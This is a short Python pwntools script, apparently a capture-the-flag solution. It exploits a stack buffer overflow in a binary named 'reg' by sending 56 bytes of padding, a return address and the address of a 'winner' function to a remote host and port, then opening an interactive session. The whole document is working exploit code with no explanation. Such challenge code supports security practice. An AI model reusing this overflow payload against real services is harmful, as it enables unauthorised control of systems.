#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./reg',checksec=False)
p = process()
#gdb.attach(p,gdbscript='''
#           b*0x00000000004012ac
#           ''')
p = remote('94.237.63.109',48716)
input()
payload = b'a'*56 + p64(0x00000000004012ac) +p64(exe.sym.winner)
p.sendlineafter(b'name : ',payload)


p.interactive()
